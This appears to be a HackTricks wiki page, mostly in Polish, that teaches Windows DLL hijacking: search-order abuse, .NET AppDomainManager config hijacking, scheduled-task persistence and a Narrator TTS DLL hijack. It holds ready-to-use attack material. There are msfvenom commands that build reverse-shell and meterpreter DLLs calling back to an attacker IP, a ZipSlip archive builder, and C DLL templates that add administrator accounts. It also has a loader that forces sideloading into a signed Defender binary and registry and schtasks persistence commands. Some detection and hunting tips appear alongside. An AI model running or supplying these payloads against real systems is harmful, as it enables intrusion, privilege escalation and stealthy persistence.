# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking polega na manipulowaniu zaufaną aplikacją tak, aby załadowała złośliwy DLL. Termin ten obejmuje kilka technik, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest to głównie wykorzystywane do code execution, uzyskania persistence oraz, rzadziej, privilege escalation. Mimo że tutaj nacisk jest na escalation, sama metoda hijackingu pozostaje taka sama dla wszystkich celów.

### Common Techniques

W DLL hijacking stosuje się kilka metod, a skuteczność każdej z nich zależy od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Podmiana oryginalnego DLL na złośliwy, opcjonalnie z użyciem DLL Proxying, aby zachować funkcjonalność oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwego DLL w ścieżce wyszukiwania przed legalnym, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwego DLL dla aplikacji, która ładuje go, myśląc, że to wymagany DLL, który nie istnieje.
4. **DLL Redirection**: Modyfikacja parametrów wyszukiwania, takich jak `%PATH%` lub pliki `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnego DLL złośliwym odpowiednikiem w katalogu WinSxS, metoda często powiązana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwego DLL w katalogu kontrolowanym przez użytkownika razem z kopią aplikacji, podobnie jak techniki Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczny DLL sideloading nie jest jedynym sposobem na zmuszenie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli plik wykonywalny celu jest aplikacją **managed**, CLR sprawdza też plik konfiguracyjny aplikacji nazwany jak plik wykonywalny (na przykład `Setup.exe.config`). Taki plik może definiować własny **AppDomainManager**. Jeśli konfiguracja wskazuje na assembly kontrolowane przez atakującego, umieszczone obok EXE, CLR ładuje je **przed normalną ścieżką kodu aplikacji** i uruchamia wewnątrz zaufanego procesu.

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, aby użyć własnego managera, muszą być obecne zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>`.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Uwagi praktyczne:
- To jest tradecraft specyficzny dla **.NET Framework**. Zależy od parsowania konfiguracji CLR, a nie od kolejności wyszukiwania Win32 DLL.
- Host musi być naprawdę **managed EXE**. Szybka triage: `sigcheck -m target.exe`, `corflags target.exe`, albo sprawdź **CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie pasować do nazwy pliku wykonywalnego (`<binary>.config`) i zwykle znajduje się **obok EXE**.
- Jest to przydatne z **signed Microsoft/vendor binaries**, ponieważ zaufany EXE pozostaje nietknięty, a złośliwy managed assembly wykonuje się w procesie.
- Jeśli już masz zapisywalny katalog instalatora/update, AppDomainManager hijacking może zostać użyty jako **first stage**, a potem klasyczny DLL sideloading lub reflective loading dla późniejszych etapów.

### AppDomainManager jako downloader + bootstrapper scheduled-task

Praktyczny wzorzec intrusion to połączenie zaufanego managed EXE z jednocześnie złośliwym `*.config` i złośliwym DLL AppDomainManager, który działa tylko jako **mały bootstrapper**:

1. Użytkownik uruchamia podpisany .NET installer lub updater z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiedni config powoduje, że CLR ładuje assembly atakującego **zanim** uruchomi się logika legalnej aplikacji.
3. Złośliwy manager wykonuje **path gate** (na przykład kontynuuje tylko wtedy, gdy host EXE działa z `Downloads`, i pozwala uruchomić drugi etap tylko z `%LOCALAPPDATA%`).
4. Jeśli sprawdzenie przejdzie, pobiera właściwy payload do ścieżki możliwej do zapisu przez użytkownika, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustawia persistence za pomocą scheduled task.

Dlaczego ten wariant ma znaczenie:
- Podpisany host EXE pozostaje bez zmian, więc triage, które haszuje tylko główny binary, może przeoczyć kompromitację.
- Proste **path-based anti-analysis** jest powszechne: przeniesienie triady ZIP/EXE/DLL na Desktop, Temp lub ścieżkę sandboxa może celowo przerwać łańcuch.
- Pierwszy etap DLL AppDomainManager może pozostać mały i mało hałaśliwy, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład persistence często spotykany z tym wzorcem:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny** dla tego użytkownika/sesji; sam w sobie nie gwarantuje eskalacji do SYSTEM.
- Ta technika jest często lepiej klasyfikowana jako **execution/persistence via .NET config abuse** niż klasyczne missing-DLL search-order hijacking, mimo że operatorzy często łączą oba podejścia.

Punkty detekcji:
- Podpisane executables .NET uruchamiane z ścieżek po **rozpakowaniu ZIP**, `Downloads`, `%TEMP%` lub innych folderów zapisywalnych przez użytkownika, z **współlokalnym** `<exe>.config`.
- Nowe scheduled tasks, których akcja wskazuje do `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads` i których nazwy naśladują aktualizatory przeglądarek/dostawców.
- Krótko żyjące procesy managed bootstrap, które natychmiast pobierają inny EXE, a potem uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie wcześnie, chyba że ścieżka executables pasuje do oczekiwanego katalogu profilu użytkownika.

### Hijacking existing scheduled task to relaunch the sideload chain

Dla persistence, nie patrz tylko na **tworzenie nowego task**. Niektóre intrusion sets czekają, aż legalny installer utworzy **normalny updater task**, a potem **przepisują action task** tak, aby istniejące name, author i trigger pozostały znajome dla defenderów.

Reusable workflow:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj task, który normalnie tworzy.
2. Wyeksportuj XML task i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.
3. Zmień tylko action, aby task uruchamiał twój **trusted host EXE** z katalogu staging zapisywalnego przez użytkownika, który następnie side-loads lub AppDomain-loads real payload.
4. Ponownie zarejestruj tę samą name task zamiast tworzyć nowy, oczywisty artifact persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Dlaczego jest bardziej stealthy:
- Nazwa zadania nadal może wyglądać legalnie (na przykład updater vendora).
- Usługa **Task Scheduler** uruchamia je, więc walidacja parent/ancestor często widzi oczekiwany chain harmonogramu zamiast `explorer.exe`.
- Zespoły DFIR, które polują tylko na **new task names**, mogą przegapić zadanie, którego rejestracja już istniała, ale którego action teraz wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` albo inną ścieżkę kontrolowaną przez attacker.

Szybkie pivots hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj `C:\Windows\System32\Tasks\*` XML oraz metadane `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` względem baseline.
- Alarmuj, gdy **vendor-looking updater task** wykonuje się z **user-writable directories** albo uruchamia .NET EXE z współlokalnym plikiem `*.config`.

> [!TIP]
> Dla chain krok po kroku, który dokłada HTML staging, AES-CTR configs i .NET implants na wierzch DLL sideloading, przejrzyj workflow poniżej.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najczęstszym sposobem na znalezienie missing Dlls w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals, **ustawiając** **następujące 2 filtry**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

i pokazując tylko **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **missing dlls ogólnie**, pozostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **missing dll inside an specific executable**, powinieneś ustawić **inny filtr, np. "Process Name" "contains" `<exec name>`, uruchomić go i zatrzymać zbieranie eventów**.

## Exploiting Missing Dlls

Aby podnieść uprawnienia, najlepsza szansa to możliwość **zapisania dll, którą proces uprzywilejowany spróbuje załadować** w miejscu, gdzie będzie ona wyszukiwana. Dzięki temu będziemy mogli **zapisać** dll w **folderze**, w którym **dll jest wyszukiwana wcześniej** niż folder, gdzie znajduje się **original dll** (dziwny przypadek), albo będziemy mogli **zapisać w jakimś folderze, w którym dll będzie wyszukiwana**, a oryginalna **dll** nie istnieje w żadnym folderze.

### Dll Search Order

**W** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **można znaleźć, jak dokładnie są ładowane Dlls.**

**Windows applications** szukają DLLs, korzystając z zestawu **pre-defined search paths**, według określonej sekwencji. Problem DLL hijacking pojawia się wtedy, gdy złośliwa DLL zostaje strategicznie umieszczona w jednym z tych katalogów, dzięki czemu zostanie załadowana przed autentyczną DLL. Rozwiązaniem zapobiegającym temu jest używanie przez aplikację absolutnych paths przy odwoływaniu się do potrzebnych DLLs.

Poniżej można zobaczyć **DLL search order on 32-bit** systems:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać path tego katalogu.(_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie ma funkcji, która pobiera path tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać path tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Zwróć uwagę, że nie obejmuje to per-application path określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy wyznaczaniu DLL search path.

To jest **default** search order z włączonym **SafeDllSearchMode**. Gdy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (default to enabled).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec zauważ, że **dll może być ładowana z podaniem absolutnego path zamiast samej nazwy**. W takim przypadku ta dll będzie **wyszukiwana tylko w tym path** (jeśli dll ma zależności, będą one wyszukiwane tak, jakby zostały załadowane po nazwie).

Istnieją inne sposoby modyfikowania search order, ale nie będę ich tutaj wyjaśniał.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Użyj filtrów **ProcMon** (`Process Name` = target EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których process szuka, ale nie może znaleźć.
2. Jeśli binary działa na **schedule/service**, wrzucenie DLL o jednej z tych nazw do **application directory** (search-order entry #1) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem prawdziwej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli twoim primitive jest **ZipSlip-style arbitrary write**, przygotuj ZIP, którego entry ucieka z extraction dir, tak aby DLL trafiła do app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do obserwowanej skrzynki odbiorczej/share; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje ono malicious DLL i wykona twój kod jako konto usługi.

### Wymuszanie sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem na deterministyczne wpływanie na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając tutaj katalog kontrolowany przez atakującego, można zmusić proces docelowy, który rozwiązuje importowaną DLL po nazwie (bez absolutnej ścieżki i bez użycia flag safe loading), do załadowania malicious DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący na twój kontrolowany folder (np. katalog, w którym działa twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy binarka docelowa rozwiązuje DLL po nazwie, loader podczas rozwiązywania skorzysta z tego podanego DllPath, umożliwiając niezawodny sideloading nawet wtedy, gdy malicious DLL nie znajduje się współlokalnie z docelowym EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu podrzędnego; różni się od SetDllDirectory, które wpływa tylko na bieżący proces.
- Cel musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez absolutnej ścieżki i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcoded absolute paths nie mogą zostać przejęte. Forwarded exports i SxS mogą zmienić kolejność priorytetów.

Minimalny przykład C (ntdll, wide strings, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład C: wymuszanie DLL sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje albo proxying do prawdziwego) w swoim katalogu DllPath.
- Uruchom podpisany binarny plik, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, używając powyższej techniki. loader rozwiązuje import przez podany DllPath i sideloads Twój DLL.

Ta technika była obserwowana w praktyce jako napędzająca wieloetapowe chainy sideloading: początkowy launcher zrzuca pomocniczy DLL, który następnie uruchamia podpisany przez Microsoft, podatny na hijack binary z niestandardowym DllPath, aby wymusić ładowanie DLL atakującego z katalogu staging.


### .NET AppDomainManager hijacking via `.exe.config`

For **.NET Framework** targets, sideloading can be done **before `Main()`** without patching memory by abusing the application's adjacent **`.exe.config`** file. Instead of relying only on the Win32 DLL search order, the attacker places a legitimate .NET EXE next to a malicious config and one or more attacker-controlled assemblies.

How the chain works:
1. The host EXE starts and the **CLR reads `<exe>.config`**.
2. The config sets **`<appDomainManagerAssembly>`** and **`<appDomainManagerType>`** so the runtime instantiates an attacker-controlled `AppDomainManager`.
3. The malicious manager gets **pre-`Main()` execution** inside the trusted host process.
4. The same config can force the CLR to resolve local assemblies first (for example `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) and can weaken runtime validation/telemetry without inline patching.

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Dlaczego to jest przydatne:
- **`<probing privatePath="."/>`** utrzymuje resolution assembly w katalogu aplikacji, zamieniając folder w przewidywalną powierzchnię sideloading.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą execution do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się legalna logika aplikacji.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji full-trust załadować niepodpisane lub zmodyfikowane assembly bez błędu walidacji strong-name.
- **`<publisherPolicy apply="no"/>`** unika przekierowań publisher-policy do nowszych assembly.
- **`<requiredRuntime ... safemode="true"/>`** sprawia, że wybór runtime jest bardziej deterministyczny.
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** z konfiguracji, zamiast tego, by implant patchował `EtwEventWrite` w pamięci.

Wzorzec operacyjny widziany w ostatnich kampaniach:
- Stage 1 upuszcza `setup.exe`, `setup.exe.config` i lokalne assembly.
- Stage 2 kopiuje je do wiarygodnie wyglądającego folderu **AppData update**, zmienia nazwę hosta na coś w rodzaju `update.exe` i uruchamia go ponownie przez **scheduled task**.
- Stage 3 weryfikuje execution context (na przykład oczekiwany parent `svchost.exe` z Task Scheduler) przed załadowaniem końcowego DLL/export RAT.

Pomysły na hunting:
- Podpisane lub w inny sposób legalne **.NET executables** uruchamiane z podejrzanymi sąsiednimi plikami **`.config`** w lokalizacjach zapisywalnych przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Scheduled tasks, które ponownie uruchamiają przemianowane binaria update z **`%LOCALAPPDATA%`** lub katalogów specyficznych dla aplikacji `\bin\update\`.
- Łańcuchy parent/child, w których scheduled task uruchamia zaufany .NET host, który natychmiast ładuje assembly spoza vendor z własnego katalogu.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Tak, wymagania są skomplikowane do spełnienia, bo **domyślnie dość trudno znaleźć uprzywilejowany executable, któremu brakuje dll** i jeszcze trudniej **mieć uprawnienia zapisu do folderu w system path** (domyślnie się nie da). Ale w źle skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz te wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest bypass UAC**, możesz tam znaleźć **PoC** Dll hijaking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy tylko zmienić ścieżkę folderu, w którym masz uprawnienia zapisu).

Zwróć uwagę, że możesz **sprawdzić swoje uprawnienia w folderze**, wykonując:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić importy pliku wykonywalnego i eksporty dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twój własny

Pamiętaj, że w kilku przypadkach Dll, które kompilujesz, musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary, jeśli te funkcje nie istnieją, **binary nie będzie w stanie ich załadować** i **exploit się nie powiedzie**.

<details>
<summary>Szablon C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w C z wejściem wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal przy starcie sprawdza przewidywalny, zależny od języka DLL lokalizacyjny, który może zostać przejęty do arbitrary code execution i persistence.

Kluczowe fakty
- Ścieżka sprawdzania (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Stara ścieżka (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli istnieje zapisywalny DLL pod kontrolą atakującego na ścieżce OneCore, zostaje on załadowany i wykonuje się `DllMain(DLL_PROCESS_ATTACH)`. Nie są wymagane żadne exporty.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
- Naive hijack będzie mówić/podświetlać UI. Aby zachować ciszę, po attach wylicz wątki Narrator, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wykonaj `SuspendThread`; kontynuuj we własnym wątku. Zobacz PoC po pełny kod.

Trigger i persistence przez konfigurację Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Przy powyższym uruchomienie Narrator ładuje podłożoną DLL. Na secure desktop (ekran logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twoja DLL wykona się jako SYSTEM na secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
